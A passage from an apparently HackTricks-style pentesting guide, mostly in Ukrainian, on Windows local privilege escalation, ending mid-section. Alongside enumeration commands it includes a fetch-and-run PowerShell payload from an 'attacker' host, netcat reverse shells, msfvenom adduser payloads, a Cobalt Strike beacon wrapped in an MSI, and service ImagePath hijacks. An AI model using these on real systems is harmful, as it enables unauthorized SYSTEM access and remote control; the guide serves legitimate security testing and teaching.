# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Найкращий інструмент для пошуку Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Початкова теорія Windows

### Access Tokens

**Якщо ви не знаєте, що таке Windows Access Tokens, прочитайте наступну сторінку перед продовженням:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Перегляньте наступну сторінку для детальнішої інформації про ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Якщо ви не знаєте, що таке integrity levels in Windows, вам слід прочитати наступну сторінку перед продовженням:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Контролі безпеки Windows

Існують різні речі в Windows, які можуть **перешкодити вам при енумерації системи**, запуску виконуваних файлів або навіть **виявленню вашої активності**. Ви повинні **прочитати** наступну **сторінку** і **перерахувати** всі ці **механізми** **захисту** перед початком privilege escalation enumeration:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

Процеси UIAccess, запущені через `RAiLaunchAdminProcess`, можна використати, щоб досягти High IL без запитів, коли перевірки secure-path AppInfo були обійдені. Перегляньте присвячений workflow обходу UIAccess/Admin Protection тут:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation можна використати для довільного запису в реєстрі як SYSTEM (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

## Інформація про систему

### Version info enumeration

Перевірте, чи має версія Windows відомі вразливості (також перевірте встановлені патчі).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Версія Exploits

This [site](https://msrc.microsoft.com/update-guide/vulnerability) is handy for searching out detailed information about Microsoft security vulnerabilities. This database has more than 4,700 security vulnerabilities, showing the **massive attack surface** that a Windows environment presents.

**На системі**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas має вбудований watson)_

**Локально з інформацією про систему**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github репозиторії exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Середовище

Чи збережені які-небудь облікові дані або чутлива інформація в env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Історія PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell файли транскрипції

Ви можете дізнатися, як увімкнути це, за адресою [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Деталі виконань конвеєра PowerShell записуються, зокрема виконані команди, виклики команд і частини скриптів. Проте повні деталі виконання та результати виводу можуть не бути зафіксовані.

Щоб увімкнути це, дотримуйтеся інструкцій у розділі документації "Transcript files", обравши **"Module Logging"** замість **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Щоб переглянути останні 15 подій із логів PowersShell, ви можете виконати:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Фіксується повний запис дій та вмісту під час виконання скрипту, що гарантує документування кожного блоку коду під час його запуску. Цей процес зберігає всеохопний аудиторський слід кожної дії, корисний для судової експертизи та аналізу шкідливої поведінки. Документуючи всю активність у момент виконання, надаються детальні відомості про процес.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Записи подій для Script Block можна знайти у Переглядачі подій Windows за шляхом: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Щоб переглянути останні 20 подій, можна використати:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Налаштування Інтернету
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Диски
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Систему можна скомпрометувати, якщо оновлення запитуються не через http**S**, а через http.

Почніть із перевірки, чи мережа використовує non-SSL WSUS update, виконавши наступне в cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Або наступне в PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Якщо ви отримаєте відповідь, наприклад одну з цих:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
І якщо `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` або `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` дорівнює `1`.

Тоді, **його можна експлуатувати.** Якщо останнє значення реєстру дорівнює `0`, запис WSUS буде ігнорований.

Щоб експлуатувати ці вразливості, можна використовувати такі інструменти: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — це MiTM озброєні експлойт-скрипти для ін’єкції «фейкових» оновлень у не-SSL WSUS трафік.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
По суті, це та вразливість, яку експлуатує цей баг:

> Якщо ми можемо змінити проксі для нашого локального користувача, і Windows Updates використовує проксі, налаштований у налаштуваннях Internet Explorer, то ми маємо можливість запускати [PyWSUS](https://github.com/GoSecure/pywsus) локально, щоб перехоплювати власний трафік і виконувати код від імені підвищеного користувача на нашому пристрої.
>
> Крім того, оскільки служба WSUS використовує налаштування поточного користувача, вона також використовуватиме його сховище сертифікатів. Якщо ми згенеруємо самопідписаний сертифікат для імені хоста WSUS і додамо цей сертифікат у сховище сертифікатів поточного користувача, ми зможемо перехоплювати як HTTP, так і HTTPS WSUS трафік. WSUS не використовує HSTS-подібні механізми для реалізації перевірки довіри при першому використанні (trust-on-first-use). Якщо поданий сертифікат довірений користувачем і має правильне ім’я хоста, служба його прийме.

Ви можете експлуатувати цю вразливість за допомогою інструменту [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (коли він стане доступний).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Багато корпоративних агентів відкривають локальну IPC-поверхню та привілейований канал оновлення. Якщо реєстрацію можна примусово перенаправити на сервер атакуючого, і апдейтер довіряє підробленому root CA або має слабку перевірку підпису, локальний користувач може доставити шкідливий MSI, який служба SYSTEM встановить. Див. узагальнену техніку (на основі ланцюжка Netskope stAgentSvc – CVE-2025-0309) тут:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` відкриває локальну службу на **TCP/9401**, яка обробляє повідомлення, контрольовані атакуючим, дозволяючи виконувати довільні команди як **NT AUTHORITY\SYSTEM**.

- **Recon**: підтвердьте прослуховувач та версію, наприклад, `netstat -ano | findstr 9401` та `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: помістіть PoC, такий як `VeeamHax.exe`, з необхідними Veeam DLL у ту саму директорію, потім ініціюйте payload від SYSTEM через локальний сокет:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Сервіс виконує команду від імені SYSTEM.
## KrbRelayUp

У Windows **доменних** середовищах існує вразливість **local privilege escalation** за певних умов. Ці умови включають середовища, де **LDAP signing is not enforced,** користувачі мають self-rights, що дозволяють їм налаштовувати **Resource-Based Constrained Delegation (RBCD),** а також можливість створювати комп’ютери в домені. Важливо зазначити, що ці **вимоги** виконуються за **налаштувань за замовчуванням**.

Знайдіть **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Для отримання додаткової інформації про послідовність атаки див. [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Якщо** ці 2 записи реєстру **увімкнені** (значення **0x1**), то користувачі будь-якого рівня привілеїв можуть встановлювати (виконувати) `*.msi` файли від імені NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Якщо у вас є сесія meterpreter, ви можете автоматизувати цю техніку за допомогою модуля **`exploit/windows/local/always_install_elevated`**

### PowerUP

Використайте команду `Write-UserAddMSI` з power-up, щоб створити у поточному каталозі Windows MSI бінарний файл для підвищення привілеїв. Цей скрипт записує попередньо скомпільований MSI інсталятор, який запитує додавання користувача/групи (тому вам знадобиться GIU доступ):
```
Write-UserAddMSI
```
Просто запустіть створений двійковий файл, щоб підвищити привілеї.

### MSI Wrapper

Прочитайте цей підручник, щоб дізнатися, як створити MSI wrapper за допомогою цих інструментів. Зауважте, що ви можете обгорнути файл "**.bat**", якщо ви **тільки** хочете **виконати** **командні рядки**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Open **Visual Studio**, select **Create a new project** and type "installer" into the search box. Select the **Setup Wizard** project and click **Next**.
- Give the project a name, like **AlwaysPrivesc**, use **`C:\privesc`** for the location, select **place solution and project in the same directory**, and click **Create**.
- Keep clicking **Next** until you get to step 3 of 4 (choose files to include). Click **Add** and select the Beacon payload you just generated. Then click **Finish**.
- Highlight the **AlwaysPrivesc** project in the **Solution Explorer** and in the **Properties**, change **TargetPlatform** from **x86** to **x64**.
- There are other properties you can change, such as the **Author** and **Manufacturer** which can make the installed app look more legitimate.
- Right-click the project and select **View > Custom Actions**.
- Right-click **Install** and select **Add Custom Action**.
- Double-click on **Application Folder**, select your **beacon.exe** file and click **OK**. This will ensure that the beacon payload is executed as soon as the installer is run.
- Under the **Custom Action Properties**, change **Run64Bit** to **True**.
- Finally, **build it**.
- If the warning `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` is shown, make sure you set the platform to x64.

### MSI Installation

Щоб виконати **інсталяцію** шкідливого файлу `.msi` у **фоновому режимі:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Щоб експлуатувати цю вразливість, ви можете використати: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Налаштування аудиту

Ці налаштування визначають, що **реєструється**, тож вам слід звернути увагу
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, цікаво знати, куди надсилаються logs
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** призначений для **керування локальними паролями облікового запису Administrator**, забезпечуючи, щоб кожен пароль був **унікальним, випадковим та регулярно оновлювався** на комп'ютерах, приєднаних до домену. Ці паролі надійно зберігаються в Active Directory і можуть бути доступні лише користувачам, яким надано достатні дозволи через ACLs, що дозволяє їм переглядати локальні паролі Administrator, якщо вони уповноважені.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Якщо активовано, **паролі у відкритому вигляді зберігаються в LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### Захист LSA

Починаючи з **Windows 8.1**, Microsoft впровадила посилений захист для Local Security Authority (LSA), щоб **блокувати** спроби недовірених процесів **читати його пам'ять** або впроваджувати код, додатково захищаючи систему.\  
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** був представлений у **Windows 10**. Його мета — захищати облікові дані, збережені на пристрої, від загроз, таких як pass-the-hash атаки.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** автентифікуються через **Local Security Authority** (LSA) та використовуються компонентами операційної системи. Коли дані входу користувача проходять автентифікацію зареєстрованим security package, зазвичай для користувача встановлюються domain credentials.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Користувачі та групи

### Перерахування користувачів і груп

Перевірте, чи якась із груп, до яких ви належите, має цікаві дозволи.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Привілейовані групи

Якщо ви **належите до якоїсь привілейованої групи — можливо, ви зможете підвищити привілеї**. Дізнайтеся про привілейовані групи та як їх використовувати для підвищення привілеїв тут:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Learn more** about what is a **token** in this page: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Перегляньте наступну сторінку, щоб **дізнатися про цікаві tokens** та як ними зловживати:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Увійшлі користувачі / Сесії
```bash
qwinsta
klist sessions
```
### Домашні папки
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Політика паролів
```bash
net accounts
```
### Отримати вміст буфера обміну
```bash
powershell -command "Get-Clipboard"
```
## Запущені процеси

### Права доступу до файлів і папок

Перш за все, переглядаючи список процесів, **перевіряйте наявність паролів у командному рядку процесу**.\
Перевірте, чи можете ви **перезаписати якийсь запущений binary** або чи маєте права запису у папці з binary, щоб експлуатувати можливі [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Завжди перевіряйте наявність можливих [**electron/cef/chromium debuggers** (запущених) — їх можна використати для підвищення привілеїв](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Перевірка дозволів бінарних файлів процесів**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Перевірка дозволів папок бінарних файлів процесів (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Ви можете створити дамп пам'яті запущеного процесу за допомогою **procdump** з sysinternals. Сервіси на кшталт FTP зберігають **credentials in clear text in memory** — спробуйте зробити дамп пам'яті та прочитати credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Небезпечні GUI-додатки

**Програми, які працюють як SYSTEM, можуть дозволити користувачеві запустити CMD або переглядати директорії.**

Приклад: "Windows Help and Support" (Windows + F1), знайдіть "command prompt", натисніть "Click to open Command Prompt"

## Служби

Service Triggers дозволяють Windows запускати службу, коли відбуваються певні умови (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Навіть без прав SERVICE_START ви часто можете запустити привілейовані служби, активувавши їх тригери. Перегляньте техніки перелічення та активації тут:

-
{{#ref}}
service-triggers.md
{{#endref}}

Отримати список служб:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Дозволи

Ви можете використовувати **sc**, щоб отримати інформацію про службу
```bash
sc qc <service_name>
```
Рекомендується мати бінарний файл **accesschk** від _Sysinternals_ для перевірки необхідного рівня привілеїв для кожної служби.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Рекомендується перевірити, чи можуть "Authenticated Users" змінювати будь-яку службу:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Ви можете завантажити accesschk.exe для XP тут](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Увімкнути службу

Якщо ви отримуєте цю помилку (наприклад з SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Ви можете ввімкнути її за допомогою
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Врахуйте, що служба upnphost залежить від SSDPSRV для роботи (для XP SP1)**

**Ще один обхідний шлях** цієї проблеми — виконати:
```
sc.exe config usosvc start= auto
```
### **Змінити шлях до бінарного файлу служби**

У випадку, коли група "Authenticated users" має **SERVICE_ALL_ACCESS** для служби, можливе змінення виконуваного файлу служби. Щоб змінити та запустити **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Перезапустити службу
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Привілеї можна підвищити через різні дозволи:

- **SERVICE_CHANGE_CONFIG**: Дозволяє переналаштування бінарного файлу сервісу.
- **WRITE_DAC**: Дає можливість переналаштування дозволів, що веде до зміни конфігурації сервісу.
- **WRITE_OWNER**: Дозволяє отримати власність і переналаштувати дозволи.
- **GENERIC_WRITE**: Успадковує можливість змінювати конфігурацію сервісу.
- **GENERIC_ALL**: Також успадковує можливість змінювати конфігурацію сервісу.

Для виявлення та експлуатації цієї вразливості можна використати _exploit/windows/local/service_permissions_.

### Слабкі дозволи бінарних файлів служб

**Перевірте, чи можете змінити бінарний файл, який виконується сервісом** або чи маєте **дозволи запису в папці**, де розташований бінарний файл ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Ви можете отримати всі бінарні файли, які виконуються службою, використовуючи **wmic** (not in system32) і перевірити ваші дозволи за допомогою **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Ви також можете використовувати **sc** та **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Дозволи на змінення service registry

Ви повинні перевірити, чи можете змінити будь-який service registry.\
Ви можете **перевірити** свої **дозволи** щодо service **registry**, виконавши:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Потрібно перевірити, чи мають **Authenticated Users** або **NT AUTHORITY\INTERACTIVE** дозволи `FullControl`. Якщо так, бінарний файл, який виконується службою, можна змінити.

Щоб змінити шлях до виконуваного бінарного файлу:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Деякі функції доступності Windows створюють для кожного користувача ключі **ATConfig**, які згодом процес **SYSTEM** копіює в сесійний ключ HKLM. registry **symbolic link race** може перенаправити цей привілейований запис у **будь-який шлях HKLM**, даючи примітив довільного HKLM **value write**.

Key locations (example: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` lists installed accessibility features.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` stores user-controlled configuration.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` is created during logon/secure-desktop transitions and is writable by the user.

Abuse flow (CVE-2026-24291 / ATConfig):

1. Заповніть значення **HKCU ATConfig**, яке ви хочете, щоб SYSTEM записав.
2. Спровокуйте копіювання secure-desktop (наприклад, **LockWorkstation**), що запускає AT broker flow.
3. Виграйте перегони, встановивши **oplock** на `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; коли oplock спрацює, замініть ключ **HKLM Session ATConfig** на **registry link** до захищеної цілі HKLM.
4. SYSTEM записує значення, обране атакуючим, у перенаправлений шлях HKLM.

Отримавши довільний запис значення в HKLM, перейдіть до LPE, перезаписавши значення конфігурації сервісу:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Виберіть службу, яку звичайний користувач може запустити (наприклад, **`msiserver`**) і запустіть її після запису. **Note:** публічна реалізація експлойту **locks the workstation** як частину перегони.

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Права AppendData/AddSubdirectory у реєстрі сервісів

Якщо ви маєте це право над ключем реєстру, це означає, що **ви можете створювати підключі з цього ключа**. У випадку Windows services це **достатньо для виконання довільного коду:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Шляхи сервісів без лапок

Якщо шлях до виконуваного файлу не взято в лапки, Windows спробує виконати кожну частину до пробілу.

Наприклад, для шляху _C:\Program Files\Some Folder\Service.exe_ Windows спробує виконати:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Перелічити всі шляхи служб без лапок, за винятком тих, що належать вбудованим службам Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Ви можете виявити та експлуатувати** цю вразливість за допомогою metasploit: `exploit/windows/local/trusted\_service\_path` Ви можете вручну створити бінарний файл служби за допомогою metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Дії відновлення

Windows дозволяє користувачам вказувати дії, що виконуються у разі збою служби. Ця функція може бути налаштована так, щоб вказувати на бінарний файл. Якщо цей бінарний файл можна замінити, може бути можливим підвищення привілеїв. Більше деталей можна знайти в [офіційній документації](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Додатки

### Встановлені додатки

Перевірте **права доступу до бінарних файлів** (можливо, ви зможете перезаписати один із них і підвищити привілеї) та до **папок** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Write Permissions

Перевірте, чи можна змінити якийсь конфігураційний файл, щоб прочитати певний файл, або чи можна змінити бінарний файл, який буде виконано під обліковим записом адміністратора (schedtasks).

Один зі способів знайти слабкі дозволи на папки/файли в системі — виконати:
```bash
accesschk.exe /accepteula
